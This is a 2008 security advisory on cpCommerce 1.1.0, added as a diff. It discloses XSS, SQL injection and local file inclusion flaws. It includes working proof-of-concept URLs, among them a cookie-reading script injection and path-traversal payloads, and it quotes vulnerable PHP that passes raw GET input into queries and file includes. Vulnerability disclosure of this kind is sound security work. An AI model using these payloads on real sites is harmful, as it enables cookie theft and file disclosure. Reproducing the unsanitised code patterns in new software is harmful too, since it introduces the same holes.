@@ -1,0 +1,85 @@
+########################## www.BugReport.ir #########################
+#
+#      AmnPardaz Security Research Team
+#
+# Title: cpCommerce Multiple Vulnerabilities
+# Vendor: http://cpcommerce.cpradio.org
+# Bugs: XSS, SQL Injection , Local File Inclusion
+# Vulnerable Version: 1.1.0 (prior versions also may be affected)
+# Exploitation: Remote with browser
+# Fix: N/A
+# Original Advisory: http://bugreport.ir/index.php?/34
+######################################################################
+
+
+####################
+- Description:
+####################
+
+cpCommerce is an open-source e-commerce solution that is maintained by templates and modules.
+
+
+####################
+- Vulnerability:
+####################
+
++-->XSS
+POC: http://localhost/v1.1.0/cpcommerce/calendar.php?obj=view.year&month=2&date=21&year=2008<script>alert(document.cookie)</script>
+
+
++-->SQL Injection
+Input passed to the "id_product","id_manufacturer" and "id_category" parameters in
+functions/display_page.func.php is not properly sanitised before being used in SQL queries.
+This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.
+
+Code Snippet:
+functions/display_page.func.php Line#94-96
+
+if (isset($_GET['id_product']) && trim($_GET['id_product']) != "") {
+$product = $db_chooser->sql_query("select `id_category`, `id_manufacturer`, `name`, `description` from " . "" . $db_chooser->Products() . " where id_product='{$_GET['id_product']}' limit 1");
+
+
++--> Local File Inclusion
+Input passed to the "language" and "action" parameters is not properly verified
+before being used to include files.
+This can be exploited to include arbitrary files from local resources.
+
+Code Snippet:
+actions/language.act.php Line#14-16
+
+  // Verify the Language file exists
+  if (isset($_GET['language']) && file_exists("{$folder}{$_GET['language']}"))
+    $_SESSION['cpLanguage'] = "{$folder}{$_GET['language']}";
+
+Code Snippet:
+_functions.php Line#109-113
+
+  ## Include Language File
+  if (isset($_SESSION['cpLanguage']))
+    require_once("{$config['document_root']}{$config['maindir']}{$_SESSION['cpLanguage']}");
+  else
+    require_once("{$config['document_root']}{$config['maindir']}{$config['language']}");
+
+POC: http://localhost/v1.1.0/cpcommerce/?action=language&language=../To%20DO%20LIST.txt
+
+---------------------------------------
+
+Code Snippet:
+_functions.php Line#148-152
+  ## Run Requested Action
+  if (isset($_GET['action'])) $_POST['action'] = $_GET['action'];
+  if (isset($_POST['submit']) || isset($_POST['action']))
+    if (isset($_POST['action'])) {
+      require_once("{$config['document_root']}{$config['maindir']}{$config['actions']}{$_POST['action']}.act.php");
+
+POC: http://localhost/v1.1.0/cpcommerce/category.php?action=../To%20DO%20LIST.txt%00
+
+####################
+- Credit :
+####################
+AmnPardaz Security Research Team
+Contact: admin[4t}bugreport{d0t]ir
+www.BugReport.ir
+www.AmnPardaz.com
+
+# milw0rm.com [2008-04-13]
